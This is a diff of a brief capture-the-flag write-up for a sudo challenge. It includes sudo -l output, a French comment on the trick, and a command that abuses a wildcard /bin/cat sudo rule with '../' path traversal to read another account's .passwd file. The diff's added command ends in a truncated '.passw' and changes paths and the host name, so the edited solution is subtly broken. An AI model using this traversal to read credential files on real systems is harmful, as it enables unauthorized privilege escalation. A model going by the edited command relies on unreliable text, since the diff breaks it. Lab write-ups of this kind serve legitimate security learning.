@@ -7,8 +7,8 @@ Matching Defaults entries for app-script-ch1 on this host:
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
     !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms, !mail_no_user
 
-User app-script-ch1 may run the following commands on this host:
-    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/ch1/*
+User app-script-ch1 may run the following commands on challenge02:
+    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*
     
 ############
 
@@ -19,7 +19,7 @@ L’astuce consiste ici à mettre un second argument à cat (le cat sera effectu
 ############
 
 
-sudo -u   app-script-ch1-cracked cat /challenge/app-script/ch1/ch1/../ch1cracked/.passwd
+sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/../ch1cracked/.passw
 
 
 ############
